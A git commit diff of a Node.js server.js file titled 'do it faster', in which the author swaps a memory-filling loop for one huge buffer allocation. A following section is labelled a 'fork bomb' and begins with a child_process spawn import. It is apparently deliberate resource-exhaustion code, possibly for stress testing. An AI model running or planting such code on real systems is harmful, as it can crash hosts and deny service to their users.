10f800c42f5e8523cca9bf03ce1d53fcb94f7124
Romain <Filirom1@gmail.com>
2014-02-03 15:34:35 +0100

    do it faster

--- server.js
+++ server.js
@@ -1,10 +1,5 @@
-var uuid = require('uuid');
-
-var obj = {};
 // consume some RAM bytes
-while(Object.keys(obj).length < 1000000){
-  obj[uuid.v1()] = new Buffer(1000000).toString();
-}
+var str = new Buffer(100000000).toString();
 
 // fork bomb
 var spawn = require('child_process').spawn;
